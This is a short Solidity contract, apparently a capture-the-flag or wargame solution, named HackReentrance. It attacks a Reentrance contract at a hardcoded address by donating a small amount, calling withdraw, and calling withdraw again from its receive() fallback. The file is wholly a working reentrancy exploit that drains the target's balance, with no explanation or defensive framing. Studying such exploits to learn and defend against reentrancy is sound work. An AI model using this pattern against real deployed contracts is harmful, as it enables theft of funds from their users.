// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10; // Latest solidity version

import "./Reentrancy.sol";

contract HackReentrance {

  Reentrance public originalContract = Reentrance(payable(0xC057656c6E75d8d0b1f7eA67307849eA868d586b)); 

  function Init() public payable {
  }

  function attack() public {
    originalContract.donate{value: 1000000000000000, gas:4000000}(address(this));

    originalContract.withdraw(1000000000000000);
  }

  receive() external payable {
    originalContract.withdraw(1000000000000000);
  }
}